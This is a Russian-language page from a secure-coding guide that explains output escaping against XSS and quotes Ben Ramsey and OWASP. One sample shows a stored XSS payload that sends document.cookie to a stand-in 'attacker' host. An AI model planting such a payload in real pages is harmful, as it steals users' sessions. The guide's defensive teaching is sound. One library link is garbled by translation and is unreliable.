# Экранируйте вывод

### Объяснение в один абзац

HTML и другие веб-языки смешивают контент с исполняемым кодом - один абзац HTML может содержать визуальное представление данных вместе с инструкциями по выполнению JavaScript. При рендеринге HTML или возврате данных из API то, что мы считаем чистым контентом, может фактически содержать код JavaScript, который будет интерпретироваться и выполняться браузером. Это происходит, например, когда мы визуализируем контент, вставленный злоумышленником, в базу данных - например, `<div><script>//malicious code</script></div>`. Это может быть смягчено путем указания браузеру обрабатывать любой кусок ненадежных данных только как контент и никогда не интерпретировать его - этот метод называется экранированием. Многие библиотеки npm и движки шаблонов HTML предоставляют возможности экранирования (пример: [escape-html](https://github.com/component/escape-html), [node-esapi](https://github.com/ESAPI/узел-esapi)). Не только HTML-контент должен быть экранирован, но также CSS и JavaScript


### Пример кода - не помещайте ненадежные данные в ваш HTML

```javascript
<script>...NEVER PUT UNTRUSTED DATA HERE...</script>   directly in a script
 
 <!--...NEVER PUT UNTRUSTED DATA HERE...-->             inside an HTML comment
 
 <div ...NEVER PUT UNTRUSTED DATA HERE...=test />       in an attribute name
 
 <NEVER PUT UNTRUSTED DATA HERE... href="/test" />   in a tag name
 
 <style>...NEVER PUT UNTRUSTED DATA HERE...</style>   directly in CSS

```

### Пример кода - вредоносный контент, который может быть введен в БД

```javascript
<div>
  <b>A pseudo comment to the a post</b>
  <script>
    window.location='http://attacker/?cookie='+document.cookie
</script>
</div>

```

<br/><br/>

### Цитата из блога: "Когда мы не хотим, чтобы символы интерпретировались"

Из блога [benramsey.com](https://benramsey.com/articles/escape-output/)
> Данные могут оставить ваше приложение в виде HTML, отправленного в веб-браузер, SQL, отправленного в базу данных, XML, отправленного в программу чтения RSS, WML, отправленного на беспроводное устройство, и т.д. Возможности безграничны. Каждый из них имеет свой собственный набор специальных символов, которые интерпретируются иначе, чем остальная часть полученного простого текста. Иногда мы хотим отправить эти специальные символы так, чтобы они интерпретировались (например, HTML-теги, отправляемые в веб-браузер), в то время как в других случаях (в случае ввода от пользователей или какого-либо другого источника) нам не нужно интерпретировать символы, поэтому мы должны экранировать их.

> Экранирование также иногда называют "кодированием". Короче говоря, это процесс представления данных таким образом, что они не будут выполнены или интерпретированы. Например, HTML будет отображать следующий текст в веб-браузере как текст, выделенный жирным шрифтом, поскольку теги `<strong>` имеют особое значение:
<strong>This is bold text.</strong>
Но, предположим, я хочу отобразить теги в браузере и избежать их интерпретации. Затем мне нужно избежать угловых скобок, которые имеют особое значение в HTML. Следующее иллюстрирует экранированный HTML:

`&lt;strong&gt;This is bold text.&lt;/strong&gt;`


<br/><br/>

### Цитата из блога: "OWASP рекомендует использовать библиотеку кодирования, ориентированную на безопасность"

Из блога OWASP [XSS (Cross Site Scripting) Prevention Cheat Sheet](https://www.owasp.org/index.php/XSS_(Cross_Site_Scripting)_Prevention_Cheat_Sheet)
> "Написание этих кодировщиков не так уж сложно, но есть немало скрытых ловушек. Например, у вас может возникнуть соблазн использовать некоторые из таких ярлыков, как `\"`, в JavaScript. Однако эти значения опасны и могут быть неправильно истолкованы вложенными анализаторами в браузере. Вы также можете забыть избежать парсинга, который злоумышленники могут использовать для нейтрализации ваших попыток быть в безопасности. **OWASP рекомендует использовать ориентированную на безопасность библиотеку кодирования, чтобы обеспечить правильное выполнение этих правил**."


<br/><br/>

### Цитата из блога: "Вы ДОЛЖНЫ использовать синтаксис escape для части HTML"

Из блога OWASP [XSS (Cross Site Scripting) Prevention Cheat Sheet](https://www.owasp.org/index.php/XSS_(Cross_Site_Scripting)_Prevention_Cheat_Sheet)
> "Но кодирование сущностей HTML не работает, если вы помещаете ненадежные данные в тег `<script>` где-либо, или в атрибут обработчика событий, например `onmouseover`, или в CSS, или в URL. Так что даже если вы используете сущность HTML Метод кодирования везде, вы все еще, скорее всего, уязвимы для XSS. Вы ДОЛЖНЫ использовать синтаксис escape для той части HTML-документа, в которую вы помещаете ненадежные данные."